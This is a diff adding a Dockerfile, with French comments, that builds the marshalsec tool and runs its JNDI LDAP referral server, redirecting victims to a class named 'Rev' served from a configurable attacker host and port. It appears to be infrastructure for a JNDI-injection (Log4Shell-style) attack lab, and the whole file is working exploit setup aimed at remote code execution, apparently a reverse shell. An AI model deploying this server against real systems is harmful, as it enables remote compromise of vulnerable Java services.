@@ -1,0 +1,14 @@
+FROM maven:3.8-jdk-11
+EXPOSE 1389
+
+RUN mkdir /marshalsec
+COPY marshalsec/ /marshalsec
+WORKDIR /marshalsec
+RUN mvn package -DskipTests
+
+# Variables avec valeurs par défaut
+ENV ATTACKER_HOST=vulnerable
+ENV ATTACKER_PORT=8888
+
+# Utiliser les variables d'environnement au lieu du hardcode
+CMD ["sh", "-c", "java -cp /marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://${ATTACKER_HOST}:${ATTACKER_PORT}/#Rev"]
